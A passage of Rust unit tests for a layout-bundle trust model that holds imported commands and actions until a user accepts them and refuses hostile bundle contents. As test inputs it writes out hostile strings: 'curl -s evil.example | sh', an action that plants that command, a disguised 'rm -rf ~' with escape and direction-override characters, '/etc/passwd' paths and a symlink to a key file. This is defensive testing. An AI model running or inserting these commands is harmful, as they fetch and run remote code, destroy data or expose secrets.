//! What a bundle carries and what an imported file may run: every command, address and `shell run` line is an item, held until it is accepted at its exact text, and a file nobody imported is never held.

#[cfg(test)]
mod tests {
    use std::path::{Path, PathBuf};

    use crate::bundle::{self, Bundle};
    use crate::*;

    const SHARED: &str = r#"
[sources.weather]
kind = "poll"
cmd = "curl -s wttr.in"
every = "5m"

[sources.feed]
kind = "http"
url = "https://example.com/feed"
lock_safe = true

[[outputs]]
match = "*"

[[outputs.layers.top.areas]]
id = "bar"
kind = "bar"
edge = "top"
thickness = 30.0

[outputs.layers.top.areas.actions]
press = ["shell run notify-send hi", "launcher toggle"]

[[outputs.layers.top.areas.groups]]
id = "start"
place = "zone"
zone = "start"
komponent = "pill"

[[outputs.layers.top.areas.groups]]
id = "end"
place = "zone"
zone = "end"

[[outputs.layers.top.areas.groups.children]]
id = "clock"
module = "clock"

[outputs.layers.top.areas.groups.children.actions]
press = ["shell run date"]
"#;

    const PILL: &str = r#"
[[children]]
id = "level"
module = "battery"

[children.actions]
long_press = ["shell run powerprofilesctl set performance"]
"#;

    fn parsed(id: &str, text: &str) -> Layout {
        let mut layout: Layout = toml::from_str(text).expect("the layout parses");
        layout.id = LayoutId::new(id);
        layout
    }

    fn pill() -> Komponent {
        toml::from_str(PILL).expect("the komponent parses")
    }

    /// The command table's allow-list as these tests need it: the launcher is shown unasked, everything else is an item.
    fn shows(line: &str) -> bool {
        line.starts_with("launcher ")
    }

    fn library(layouts: impl IntoIterator<Item = Layout>) -> Library {
        let mut library = Library::of_layouts(layouts).with_komponent("pill", pill());
        library.trust = Trust::with_rule(shows);
        library
    }

    fn imported(mut library: Library) -> Library {
        library.trust.import("layouts/shared.toml", "nord");
        library.trust.import("components/pill.toml", "nord");
        library
    }

    fn all_items(library: &Library) -> Vec<Item> {
        let trust = &library.trust;
        let mut items: Vec<Item> = library
            .layouts
            .values()
            .flat_map(|layout| layout_items(layout, trust))
            .collect();
        for (id, komponent) in &library.komponents {
            items.extend(komponent_items(id, komponent, trust));
        }
        items
    }

    fn bar(resolved: &Resolved) -> &ResolvedArea {
        resolved
            .area(LayerKind::Top, &AreaId::new("bar"))
            .expect("the bar resolves")
    }

    fn pressed(resolved: &Resolved, id: &str) -> Vec<String> {
        resolved
            .instances()
            .find(|instance| instance.id.as_str() == id)
            .unwrap_or_else(|| panic!("`{id}` resolves"))
            .actions
            .values()
            .flat_map(|action| action.0.clone())
            .collect()
    }

    fn bar_press(resolved: &Resolved) -> Vec<String> {
        bar(resolved).actions[&Trigger::Press].0.clone()
    }

    #[test]
    fn every_command_address_and_shell_run_line_is_an_item_where_it_is_written() {
        let shared = parsed("shared", SHARED);
        let items: Vec<(String, ItemKind, String, bool)> =
            layout_items(&shared, &Trust::with_rule(shows))
                .into_iter()
                .map(|item| (item.key, item.kind, item.text, item.lock_safe))
                .collect();
        let at = "outputs.*.layers.top.areas.bar";
        assert_eq!(
            items,
            [
                (
                    "sources.feed.url".to_string(),
                    ItemKind::Http,
                    "https://example.com/feed".to_string(),
                    true
                ),
                (
                    "sources.weather.cmd".to_string(),
                    ItemKind::Poll,
                    "curl -s wttr.in".to_string(),
                    false
                ),
                (
                    format!("{at}.actions.press"),
                    ItemKind::Action,
                    "shell run notify-send hi".to_string(),
                    false
                ),
                (
                    format!("{at}.groups.end.children.clock.actions.press"),
                    ItemKind::Action,
                    "shell run date".to_string(),
                    false
                ),
            ],
            "`launcher toggle` acts inside the shell, so it is not one"
        );
        let komponent =
            komponent_items(&KomponentId::new("pill"), &pill(), &Trust::with_rule(shows));
        assert_eq!(komponent.len(), 1);
        assert_eq!(komponent[0].file, "components/pill.toml");
        assert_eq!(komponent[0].key, "children.level.actions.long_press");
        assert_ne!(
            layout_items(&shared, &Trust::with_rule(shows))[0].id(),
            layout_items(&shared, &Trust::with_rule(shows))[1].id(),
            "each item has a name of its own"
        );
    }

    /// T-8.6's acceptance, in the model: an imported file's commands, addresses and `shell run` lines — a komponent child's included — are held until accepted, each at its own text.
    #[test]
    fn an_imported_file_runs_nothing_until_each_item_is_accepted_at_its_text() {
        let mut library = imported(library([parsed("shared", SHARED)]));
        let shared = library.layouts[&LayoutId::new("shared")].clone();

        let (resolved, _) = resolve(&shared, &library, NOMINAL_OUTPUT, None);
        assert_eq!(bar_press(&resolved), ["launcher toggle"]);
        assert!(
            pressed(&resolved, "clock").is_empty(),
            "the gesture is kept, doing nothing"
        );
        assert!(pressed(&resolved, "bar.start/level").is_empty());
        assert!(
            sources(&shared, &library).0.is_empty(),
            "no source is declared"
        );
        let held_now = held(&shared, &library);
        assert_eq!(held_now.warnings.len(), 5, "{}", held_now.render());
        assert!(held_now.errors.is_empty(), "waiting is not wrong");
        assert!(
            held_now
                .findings()
                .all(|finding| finding.message.key() == Some("finding.trust_pending"))
        );

        for item in all_items(&library) {
            library.trust.decide(&item, true);
        }
        let (resolved, _) = resolve(&shared, &library, NOMINAL_OUTPUT, None);
        assert_eq!(
            bar_press(&resolved),
            ["shell run notify-send hi", "launcher toggle"]
        );
        assert_eq!(pressed(&resolved, "clock"), ["shell run date"]);
        assert_eq!(
            pressed(&resolved, "bar.start/level"),
            ["shell run powerprofilesctl set performance"]
        );
        assert_eq!(sources(&shared, &library).0.len(), 2);
        assert!(held(&shared, &library).is_clean());

        let mut edited = shared.clone();
        if let Some(Source::Poll { cmd, .. }) = edited.sources.get_mut("weather") {
            *cmd = Some("curl -s evil.example | sh".to_string());
        }
        library.layouts.insert(edited.id.clone(), edited.clone());
        let declared = sources(&edited, &library).0;
        assert!(
            !declared.contains_key("weather"),
            "the edited command asks again"
        );
        assert!(declared.contains_key("feed"), "and nothing else does");
        let (resolved, _) = resolve(&edited, &library, NOMINAL_OUTPUT, None);
        assert_eq!(
            bar_press(&resolved),
            ["shell run notify-send hi", "launcher toggle"]
        );
        let asked = held(&edited, &library);
        assert_eq!(asked.warnings.len(), 1, "{}", asked.render());
        assert_eq!(asked.warnings[0].key, "sources.weather.cmd");

        let press = layout_items(&edited, &library.trust)
            .into_iter()
            .find(|item| item.text == "shell run notify-send hi")
            .expect("the area's line");
        library.trust.decide(&press, false);
        let (resolved, _) = resolve(&edited, &library, NOMINAL_OUTPUT, None);
        assert_eq!(bar_press(&resolved), ["launcher toggle"]);
        assert_eq!(library.trust.verdict(&press), Verdict::Declined);
        assert!(
            held(&edited, &library)
                .findings()
                .any(|finding| finding.message.key() == Some("finding.trust_declined"))
        );
    }

    /// A lock promise is part of what is accepted: a file that starts making one asks again.
    #[test]
    fn a_source_that_starts_saying_lock_safe_asks_again() {
        let mut library = imported(library([parsed("shared", SHARED)]));
        for item in all_items(&library) {
            library.trust.decide(&item, true);
        }
        let mut promising = library.layouts[&LayoutId::new("shared")].clone();
        if let Some(Source::Poll { lock_safe, .. }) = promising.sources.get_mut("weather") {
            *lock_safe = Some(true);
        }
        library
            .layouts
            .insert(promising.id.clone(), promising.clone());
        assert!(!sources(&promising, &library).0.contains_key("weather"));
    }

    #[test]
    fn a_layout_nobody_imported_is_never_held() {
        let mut library = library([parsed("shared", SHARED)]);
        library.trust.import("layouts/other.toml", "nord");
        let shared = library.layouts[&LayoutId::new("shared")].clone();
        assert!(
            layout_items(&shared, &Trust::with_rule(shows))
                .iter()
                .all(|item| library.trust.verdict(item) == Verdict::Own)
        );
        let (resolved, _) = resolve(&shared, &library, NOMINAL_OUTPUT, None);
        assert_eq!(
            bar_press(&resolved),
            ["shell run notify-send hi", "launcher toggle"]
        );
        assert_eq!(sources(&shared, &library).0.len(), 2);
        assert!(held(&shared, &library).is_clean());
    }

    /// What a layout of the user's inherits from an imported one is held where the imported file wrote it; what the user writes over it is theirs.
    #[test]
    fn a_users_layout_extending_an_imported_one_holds_what_it_inherits_and_runs_what_it_writes() {
        let mine = parsed(
            "mine",
            "extends = \"shared\"\n[sources.weather]\nkind = \"poll\"\ncmd = \"echo sunny\"\n",
        );
        let library = imported(library([parsed("shared", SHARED), mine.clone()]));
        let declared = sources(&mine, &library).0;
        assert!(
            declared.contains_key("weather"),
            "the user wrote this command"
        );
        assert!(
            !declared.contains_key("feed"),
            "the bundle wrote this address"
        );
        let (resolved, _) = resolve(&mine, &library, NOMINAL_OUTPUT, None);
        assert_eq!(bar_press(&resolved), ["launcher toggle"]);
        let asked = held(&mine, &library);
        assert!(
            asked
                .findings()
                .all(|finding| finding.file == Path::new("layouts/shared.toml")
                    || finding.file == Path::new("components/pill.toml")),
            "{}",
            asked.render()
        );
    }

    /// What is accepted is a text and the promise the whole chain runs it under: one bundle file that starts promising the lock screen what another bundle file runs asks again for that command alone, listed as the pair it now is.
    #[test]
    fn a_lock_promise_another_bundle_file_makes_asks_again() {
        let promising = parsed(
            "promising",
            "extends = \"shared\"\n[sources.weather]\nkind = \"poll\"\nlock_safe = true\n",
        );
        let mut library = imported(library([parsed("shared", SHARED), promising.clone()]));
        library.trust.import("layouts/promising.toml", "nord");
        let shared = library.layouts[&LayoutId::new("shared")].clone();
        for item in all_items(&library) {
            library.trust.decide(&item, true);
        }
        assert_eq!(sources(&shared, &library).0.len(), 2, "accepted as written");

        let declared = sources(&promising, &library).0;
        assert!(
            !declared.contains_key("weather"),
            "the promise is new, so the command asks again"
        );
        assert!(declared.contains_key("feed"), "and nothing else does");
        let asked = held(&promising, &library);
        assert_eq!(asked.warnings.len(), 1, "{}", asked.render());
        assert_eq!(asked.warnings[0].file, Path::new("layouts/shared.toml"));
        assert_eq!(asked.warnings[0].key, "sources.weather.cmd");

        let promised = library_items(&library)
            .into_iter()
            .find(|item| item.key == "sources.weather.cmd" && item.lock_safe)
            .expect("listed under the promise the chain makes");
        assert_eq!(library.trust.verdict(&promised), Verdict::Pending);
        library.trust.decide(&promised, true);
        let declared = sources(&promising, &library).0;
        assert!(declared["weather"].lock_safe(), "accepted with its promise");
        assert_eq!(sources(&shared, &library).0.len(), 2);
    }

    /// A store of `shared` (a bundle's) and `mine` (the user's, extending it), with the bundle's komponent `pill`.
    fn store_of(test: &str, mine: &str) -> LayoutStore {
        let dir = scratch(test).join("layouts");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("shared.toml"), SHARED).unwrap();
        std::fs::write(dir.join("mine.toml"), mine).unwrap();
        let components = components_beside(&dir);
        std::fs::create_dir_all(&components).unwrap();
        std::fs::write(components.join("pill.toml"), PILL).unwrap();
        let (mut store, report) = LayoutStore::load(&dir);
        assert!(report.is_clean(), "{}", report.render());
        store.set_trust(imported(library([])).trust);
        store
    }

    const MINE: &str = r#"
extends = "shared"

[[outputs]]
match = "*"

[[outputs.layers.top.areas]]
id = "dock"
kind = "bar"
edge = "bottom"
thickness = 30.0

[[outputs.layers.top.areas.groups]]
id = "mine"
place = "zone"
zone = "end"
"#;

    fn the_clock(store: &LayoutStore) -> Instance {
        store.get(&LayoutId::new("shared")).unwrap().outputs[0]
            .layers
            .top
            .areas[0]
            .groups[1]
            .children[0]
            .clone()
    }

    fn into_mine(instance: Instance) -> Transaction {
        Transaction::new(
            "Copy the clock",
            LayoutId::new("mine"),
            vec![LayoutOp::InsertInstance {
                spot: Spot {
                    site: Site::new("*", LayerKind::Top),
                    area: AreaId::new("dock"),
                    group: GroupId::new("mine"),
                },
                index: 0,
                instance: Box::new(instance),
            }],
        )
    }

    fn refused_as_carried(refused: StoreError, text: &str) {
        match refused {
            StoreError::Carried(carried) => {
                assert_eq!(carried.item.text, text);
                assert_eq!(carried.bundle, "nord");
                assert!(
                    carried.message().english().contains("layout trust nord"),
                    "{}",
                    carried.message().english()
                );
            }
            other => panic!("refused for another reason: {other}"),
        }
    }

    /// Trust follows the text: an edit that copies a line a bundle runs held into a file of the user's own is refused whole — the layout as it was, nothing to undo — until the user trusts that line; declined is held too.
    #[test]
    fn an_edit_cannot_copy_a_held_line_into_a_file_of_the_users_own() {
        let mut store = store_of("carry-commit", MINE);
        let before = store.get(&LayoutId::new("mine")).unwrap().clone();
        let clock = the_clock(&store);

        let refused = store
            .commit(into_mine(clock.clone()))
            .expect_err("the bundle's line would become the user's");
        refused_as_carried(refused, "shell run date");
        assert_eq!(store.get(&LayoutId::new("mine")).unwrap(), &before);
        assert_eq!(store.undo_label(), None, "nothing to take back");

        let mut silent = clock.clone();
        silent.actions.clear();
        store
            .commit(into_mine(silent))
            .expect("the same instance without the line is the user's to copy");

        let item = library_items(store.all())
            .into_iter()
            .find(|item| item.text == "shell run date")
            .expect("the bundle's line");
        let mut trust = store.all().trust.clone();
        trust.decide(&item, false);
        store.set_trust(trust.clone());
        let mut again = clock.clone();
        again.id = InstanceId::new("clock-2");
        refused_as_carried(
            store.commit(into_mine(again.clone())).unwrap_err(),
            "shell run date",
        );

        trust.decide(&item, true);
        store.set_trust(trust);
        store
            .commit(into_mine(again))
            .expect("once trusted, the text is the user's to copy");
    }

    /// Inside the bundle's own file a moved line stays held where it lands, and a text the user's file already runs is theirs: neither is refused.
    #[test]
    fn an_edit_inside_a_bundles_file_or_of_the_users_own_text_is_not_refused() {
        let mine = MINE.replace(
            "zone = \"end\"\n",
            "zone = \"end\"\n\n[[outputs.layers.top.areas.groups.children]]\nid = \"mine-date\"\nmodule = \"clock\"\n\n[outputs.layers.top.areas.groups.children.actions]\npress = [\"shell run date\"]\n",
        );
        let mut store = store_of("carry-own", &mine);
        let clock = the_clock(&store);
        let mut copy = clock.clone();
        copy.id = InstanceId::new("clock-copy");
        store
            .commit(into_mine(copy))
            .expect("the user's file ran this text already");

        let mut moved = clock;
        moved.id = InstanceId::new("clock-moved");
        store
            .commit(Transaction::new(
                "Copy within the bundle",
                LayoutId::new("shared"),
                vec![LayoutOp::InsertInstance {
                    spot: Spot {
                        site: Site::new("*", LayerKind::Top),
                        area: AreaId::new("bar"),
                        group: GroupId::new("end"),
                    },
                    index: 1,
                    instance: Box::new(moved),
                }],
            ))
            .expect("the bundle's file holds it item by item");
        let shared = store.get(&LayoutId::new("shared")).unwrap().clone();
        let (resolved, _) = resolve(&shared, store.all(), NOMINAL_OUTPUT, None);
        assert!(
            pressed(&resolved, "clock-moved").is_empty(),
            "still held where it landed"
        );
    }

    /// A komponent saved from what a bundle runs, or a fork of a bundle's layout, is a new file of the user's own: refused while it would carry a held line.
    #[test]
    fn a_new_komponent_or_layout_cannot_carry_a_held_line() {
        let mut store = store_of("carry-new", MINE);
        let refused = store
            .add_komponent(KomponentId::new("my-pill"), pill())
            .expect_err("the komponent would run the bundle's line as the user's");
        refused_as_carried(refused, "shell run powerprofilesctl set performance");
        assert!(store.komponent(&KomponentId::new("my-pill")).is_none());

        let refused = store
            .fork(&LayoutId::new("shared"), LayoutId::new("copied"))
            .expect_err("a copy of the bundle's layout would be the user's");
        assert!(matches!(refused, StoreError::Carried(_)), "{refused}");
        assert!(store.get(&LayoutId::new("copied")).is_none());
    }

    #[test]
    fn no_action_may_grant_trust() {
        assert!(trust::grants_trust("layout trust nord --all"));
        assert!(!trust::grants_trust("layout check"));
        let trust = Trust::with_rule(shows);
        assert!(trust.is_item("shell   run  date"));
        assert!(trust.is_item("shell reload"));
        assert!(!trust.is_item("launcher toggle"));
        assert!(
            !trust.is_item("layout trust nord --all"),
            "never run, so never asked"
        );
        assert!(!trust.runs_unasked("layout trust nord --all"));

        let mut shared = parsed("shared", SHARED);
        shared.outputs[0].layers.top.areas[0].actions.insert(
            Trigger::Secondary,
            Action(vec!["layout trust nord --all".to_string()]),
        );
        let report = validate(&shared, &Anything);
        assert!(
            report
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.trust_in_action")),
            "{}",
            report.render()
        );
        let mut library = imported(library([shared.clone()]));
        for item in all_items(&library) {
            library.trust.decide(&item, true);
        }
        let (resolved, _) = resolve(&shared, &library, NOMINAL_OUTPUT, None);
        assert!(
            bar(&resolved).actions[&Trigger::Secondary].0.is_empty(),
            "an imported file never gets to run it, accepted or not"
        );
    }

    /// Asks nothing of anyone: every module, representation and command line is known, and no expression is written.
    struct Anything;

    impl Catalogue for Anything {
        fn knows_module(&self, _: &str) -> bool {
            true
        }
        fn has_representation(&self, _: &str, _: Representation) -> bool {
            true
        }
        fn is_read_only(&self, _: &str, _: Representation) -> bool {
            true
        }
        fn command_resolves(&self, _: &str) -> bool {
            true
        }
        fn option_problems(
            &self,
            _: &str,
            _: &toml::Table,
        ) -> Vec<(String, util::report::Message)> {
            Vec::new()
        }
        fn is_service_source(&self, _: &str) -> bool {
            false
        }
        fn compile_with(
            &self,
            source: &str,
            _: bool,
            _: &Locals,
        ) -> Result<telar_expression::Compiled, telar_expression::Errors> {
            telar_expression::compile(
                source,
                &telar_expression::Closed,
                &telar_expression::Registry::standard(),
            )
        }
        fn binding_type(
            &self,
            _: &str,
            _: &str,
        ) -> Result<telar_expression::Type, util::report::Message> {
            Err(util::report::Message::verbatim("nothing is bound here"))
        }
    }

    fn scratch(name: &str) -> PathBuf {
        let dir = util::paths::isolated_root()
            .expect("a test resolves under its scratch root")
            .join(format!("bundle-tests-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a scratch directory");
        dir
    }

    fn picture(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
        std::fs::create_dir_all(dir).unwrap();
        let path = dir.join(name);
        std::fs::write(&path, bytes).unwrap();
        path
    }

    fn painted(source: &Path, image: &Path) -> (Layout, Layout) {
        let base = parsed(
            "base",
            &format!(
                "[[outputs]]\nmatch = \"*\"\n[[outputs.layers.background.areas]]\nid = \"wall\"\nkind = \"wallpaper_region\"\nsource = \"{}\"\n",
                source.display()
            ),
        );
        let mut shared = parsed("shared", &format!("extends = \"base\"\n{SHARED}"));
        shared.outputs[0].layers.background.areas.push(Area {
            id: AreaId::new("grain"),
            kind: Some(AreaKind::Texture {
                rect: None,
                image: Some(image.display().to_string()),
                gradient: None,
                tile: None,
                blend: None,
                opacity: None,
            }),
            ..Area::default()
        });
        (base, shared)
    }

    fn pictures_named(layout: &Layout) -> Vec<String> {
        let mut layout = layout.clone();
        bundle::asset_paths_mut(&mut layout)
            .into_iter()
            .map(|(_, path)| path.clone())
            .collect()
    }

    #[test]
    fn a_bundle_round_trips_its_layouts_komponents_and_pictures_with_the_paths_rewritten() {
        let dir = scratch("round-trip");
        let source = picture(&dir.join("a"), "wall.png", b"first");
        let image = picture(&dir.join("b"), "wall.png", b"second");
        let (base, shared) = painted(&source, &image);
        let library = library([base, shared]);

        let made = bundle::export(&LayoutId::new("shared"), &library).expect("it exports");
        assert_eq!(made.manifest.name, "shared");
        assert_eq!(
            made.layouts
                .keys()
                .map(LayoutId::as_str)
                .collect::<Vec<_>>(),
            ["base", "shared"],
            "the layout and the one it extends, not the built-in one"
        );
        assert_eq!(
            made.komponents
                .keys()
                .map(KomponentId::as_str)
                .collect::<Vec<_>>(),
            ["pill"]
        );
        assert_eq!(
            made.assets.keys().map(String::as_str).collect::<Vec<_>>(),
            ["wall-2.png", "wall.png"],
            "two pictures sharing a name keep a name each"
        );
        assert_eq!(
            pictures_named(&made.layouts[&LayoutId::new("base")]),
            ["assets/wall.png"]
        );
        assert_eq!(
            pictures_named(&made.layouts[&LayoutId::new("shared")]),
            ["assets/wall-2.png"]
        );

        let out = dir.join("out");
        made.write(&out).expect("it writes");
        assert_eq!(
            std::fs::read(out.join("assets/wall-2.png")).unwrap(),
            b"second"
        );
        assert!(
            !std::fs::read_to_string(out.join("manifest.toml"))
                .unwrap()
                .contains("version"),
            "no version field (DEC-29)"
        );
        let read: Bundle = bundle::read(&out).expect("it reads back");
        assert_eq!(read.manifest, made.manifest);
        assert_eq!(read.layouts, made.layouts);
        assert_eq!(read.komponents, made.komponents);
        assert_eq!(
            read.assets.keys().collect::<Vec<_>>(),
            made.assets.keys().collect::<Vec<_>>()
        );
        assert!(read.texts.contains_key("layouts/shared.toml"));

        let home = dir.join("installed");
        let installed = read.installed_at(&home);
        assert_eq!(
            pictures_named(&installed.layouts[&LayoutId::new("shared")]),
            [home.join("wall-2.png").display().to_string()]
        );

        let again = made
            .write(&out)
            .expect_err("a bundle is never written over another");
        assert!(
            again
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_exists"))
        );
    }

    #[test]
    fn a_layout_that_cannot_travel_is_not_exported() {
        let dir = scratch("cannot-travel");
        let (base, shared) = painted(&dir.join("gone.png"), &dir.join("gone-too.png"));
        let library = library([base, shared]);
        let refused =
            bundle::export(&LayoutId::new("shared"), &library).expect_err("missing pictures");
        assert_eq!(
            refused
                .errors
                .iter()
                .filter(|finding| finding.message.key() == Some("finding.bundle_asset_missing"))
                .count(),
            2,
            "{}",
            refused.render()
        );
        let built_in = bundle::export(&LayoutId::new(BUILT_IN), &Library::of_layouts([built_in()]))
            .expect_err("every installation has it already");
        assert_eq!(
            built_in.errors[0].message.key(),
            Some("finding.bundle_built_in")
        );
    }

    fn written(dir: &Path, file: &str, text: &str) {
        let path = dir.join(file);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    /// DEC-29: an incompatible bundle fails with ordinary findings, each where it is, and nothing of it is read.
    #[test]
    fn a_bundle_that_is_wrong_says_where_and_reads_as_nothing() {
        let dir = scratch("wrong");
        written(&dir, "manifest.toml", "name = \"nord\"\nversion = 2\n");
        written(&dir, "layouts/broken.toml", "[[outputs]\n");
        written(&dir, "layouts/default.toml", "");
        written(&dir, "layouts/my.layout.toml", "");
        written(
            &dir,
            "layouts/peek.toml",
            "[[outputs]]\nmatch = \"*\"\n[[outputs.layers.background.areas]]\nid = \"wall\"\nkind = \"wallpaper_region\"\nsource = \"/etc/passwd\"\n",
        );
        let report = bundle::read(&dir).expect_err("it is refused");
        let at = |file: &str| {
            report
                .errors
                .iter()
                .filter(|finding| finding.file == dir.join(file))
                .count()
        };
        assert_eq!(at("manifest.toml"), 1, "{}", report.render());
        assert!(report.render().contains("version"), "{}", report.render());
        assert_eq!(at("layouts/broken.toml"), 1);
        assert_eq!(at("layouts/default.toml"), 1);
        assert_eq!(at("layouts/my.layout.toml"), 1);
        let outside = report
            .errors
            .iter()
            .find(|finding| finding.file == dir.join("layouts/peek.toml"))
            .expect("the picture outside the bundle");
        assert_eq!(outside.key, "outputs.*.layers.background.areas.wall.source");
        assert_eq!(outside.message.key(), Some("finding.bundle_asset_path"));

        let empty = scratch("empty");
        let report = bundle::read(&empty).expect_err("no manifest, no layouts");
        assert!(
            report
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_no_manifest"))
        );
    }

    /// The exploit F-10.54 closes: a komponent child whose action writes a `shell run` line into another instance's actions would plant a command in a file of the user's own, which runs whatever it holds. Every action line that does more than move what the shell shows is an item, so the planting line itself waits for trust like a command does.
    #[test]
    fn a_line_that_writes_an_action_is_held_like_a_command() {
        let planting: Komponent = toml::from_str(
            "[[children]]\nid = \"level\"\nmodule = \"battery\"\n[children.actions]\npress = [\"layout set clock actions.press shell run curl evil.example | sh\", \"launcher toggle\"]\n",
        )
        .unwrap();
        let mut library = imported(library([parsed("shared", SHARED)]));
        library
            .komponents
            .insert(KomponentId::new("pill"), planting);
        let shared = library.layouts[&LayoutId::new("shared")].clone();

        let (resolved, _) = resolve(&shared, &library, NOMINAL_OUTPUT, None);
        assert_eq!(pressed(&resolved, "bar.start/level"), ["launcher toggle"]);
        let item = library_items(&library)
            .into_iter()
            .find(|item| item.text.starts_with("layout set clock"))
            .expect("the planting line is an item");
        assert_eq!(item.kind, ItemKind::Action);
        assert_eq!(library.trust.verdict(&item), Verdict::Pending);
        assert!(
            held(&shared, &library)
                .findings()
                .any(|finding| finding.message.english().contains("layout set clock")),
        );
    }

    /// No write puts a line granting trust into an action chain — a file of the user's own included, which nothing would hold — and a refused write leaves nothing of itself in memory for a flush to write.
    #[test]
    fn a_write_adding_a_line_that_grants_trust_is_refused_and_leaves_nothing_behind() {
        let mut store = store_of("grant-commit", MINE);
        let before = store.get(&LayoutId::new("mine")).unwrap().clone();
        let mut granting = Instance {
            id: InstanceId::new("granter"),
            module: Some("clock".to_string()),
            ..Instance::default()
        };
        granting.actions.insert(
            Trigger::Press,
            Action(vec!["layout trust nord --all".to_string()]),
        );
        let refused = store
            .commit(into_mine(granting))
            .expect_err("trust is the user's to give");
        assert!(
            matches!(&refused, StoreError::GrantsTrust { line, .. } if line == "layout trust nord --all"),
            "{refused}"
        );
        assert_eq!(store.get(&LayoutId::new("mine")).unwrap(), &before);
        assert!(!store.has_unsaved(), "nothing waits to be written");

        let refused = store
            .commit(into_mine(the_clock(&store)))
            .expect_err("the bundle's held line");
        assert!(matches!(refused, StoreError::Carried(_)));
        assert_eq!(store.get(&LayoutId::new("mine")).unwrap(), &before);
        assert!(store.flush().is_clean());
        let written = std::fs::read_to_string(store.path_of(&LayoutId::new("mine"))).unwrap();
        assert!(!written.contains("shell run date"), "{written}");
    }

    /// An item's id answers for all of it — file, key, text and promise — as a SHA-256, so an edited text is another id, and a list's id changes with anything added to it, whatever order it comes in.
    #[test]
    fn an_items_name_is_a_strong_hash_of_all_of_it() {
        let item = Item {
            file: "layouts/shared.toml".to_string(),
            key: "sources.weather.cmd".to_string(),
            kind: ItemKind::Poll,
            text: "curl -s wttr.in".to_string(),
            lock_safe: false,
        };
        let id = item.id();
        assert_eq!(id.len(), 32, "128 bits");
        assert!(id.chars().all(|c| c.is_ascii_hexdigit()));
        let edited = Item {
            text: "curl -s wttr.im".to_string(),
            ..item.clone()
        };
        let promising = Item {
            lock_safe: true,
            ..item.clone()
        };
        assert_ne!(edited.id(), id);
        assert_ne!(promising.id(), id);
        assert_eq!(
            set_of(&[item.clone(), edited.clone()]),
            set_of(&[edited.clone(), item.clone()])
        );
        assert_ne!(set_of(std::slice::from_ref(&item)), set_of(&[item, edited]));
        assert_eq!(set_of(&[]).len(), 32);
    }

    /// What could disguise a text — a terminal escape, a carriage return, a line break, a direction override or isolate, an invisible character — is written out wherever an item is shown, and nothing else is touched.
    #[test]
    fn what_could_disguise_a_text_is_written_out() {
        assert_eq!(
            util::text::shown("ls\u{1b}[2K\rrm -rf ~\n\u{202e}gpj.exe\u{2066}x\u{200b}"),
            "ls\\u{1b}[2K\\rrm -rf ~\\n\\u{202e}gpj.exe\\u{2066}x\\u{200b}"
        );
        assert_eq!(
            util::text::shown("curl 'wttr.in/Reykjavík'"),
            "curl 'wttr.in/Reykjavík'"
        );
        let item = Item {
            file: "layouts/shared.toml".to_string(),
            key: "sources.weather.cmd".to_string(),
            kind: ItemKind::Poll,
            text: "echo ok\u{1b}]0;title\u{7}".to_string(),
            lock_safe: false,
        };
        assert_eq!(
            item.what().english(),
            "the command `echo ok\\u{1b}]0;title\\u{7}`"
        );
    }

    /// A direction override or isolate has no use in a command, an address or an action, and makes the text read as something other than what runs: a bundle carrying one is refused, saying where.
    #[test]
    fn a_bundle_with_a_direction_override_in_what_it_runs_is_refused() {
        let dir = scratch("bidi");
        written(&dir, "manifest.toml", "name = \"nord\"\n");
        written(
            &dir,
            "layouts/shared.toml",
            &SHARED.replace("curl -s wttr.in", "curl -s wttr.in \u{202e}hs | lru"),
        );
        written(
            &dir,
            "components/pill.toml",
            &PILL.replace("performance", "performance \u{2067}#"),
        );
        let report = bundle::read(&dir).expect_err("refused");
        let bidi: Vec<(&Path, &str)> = report
            .errors
            .iter()
            .filter(|finding| finding.message.key() == Some("finding.bundle_bidi"))
            .map(|finding| (finding.file.as_path(), finding.key.as_str()))
            .collect();
        assert_eq!(
            bidi,
            [
                (
                    dir.join("layouts/shared.toml").as_path(),
                    "sources.weather.cmd"
                ),
                (
                    dir.join("components/pill.toml").as_path(),
                    "children.level.actions.long_press"
                ),
            ],
            "{}",
            report.render()
        );
        assert!(report.render().contains("\\u{202e}"), "{}", report.render());
    }

    fn fifo(path: &Path) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        let name = std::ffi::CString::new(path.as_os_str().as_encoded_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(name.as_ptr(), 0o600) }, 0, "mkfifo");
    }

    /// Reads the bundle at `dir` on a thread of its own, failing the test if that does not answer in seconds — which is what a read waiting on a FIFO's writer would do.
    fn read_in_time(dir: &Path) -> Result<Bundle, util::report::Report> {
        let dir = dir.to_path_buf();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(bundle::read(&dir));
        });
        rx.recv_timeout(std::time::Duration::from_secs(5))
            .expect("the read answered rather than waiting on a FIFO")
    }

    /// A bundle is somebody else's directory: a FIFO is never opened, a link never followed, a file larger than its kind may be never read whole — each refused, saying where, and the read answers at once.
    #[test]
    fn a_fifo_a_link_or_an_oversized_file_in_a_bundle_is_refused_without_waiting() {
        let dir = scratch("hostile");
        let secret = picture(&scratch("hostile-home"), "id_ed25519.toml", b"[key]\n");
        written(&dir, "manifest.toml", "name = \"nord\"\n");
        written(&dir, "layouts/shared.toml", SHARED);
        fifo(&dir.join("layouts/pipe.toml"));
        std::os::unix::fs::symlink(&secret, dir.join("layouts/link.toml")).unwrap();
        let big = format!(
            "# {}\n",
            "x".repeat(config::fingerprint::LAYOUT_FILE_LIMIT as usize)
        );
        written(&dir, "layouts/big.toml", &big);
        std::os::unix::fs::symlink(secret.parent().unwrap(), dir.join("components")).unwrap();
        fifo(&dir.join("manifest-pipe/manifest.toml"));

        let report = read_in_time(&dir).expect_err("refused");
        let about = |file: &str| {
            report
                .errors
                .iter()
                .find(|finding| finding.file == dir.join(file))
                .and_then(|finding| finding.message.key())
                .unwrap_or_else(|| panic!("nothing about {file}: {}", report.render()))
                .to_string()
        };
        assert_eq!(about("layouts/pipe.toml"), "finding.bundle_not_plain");
        assert_eq!(about("layouts/link.toml"), "finding.bundle_link");
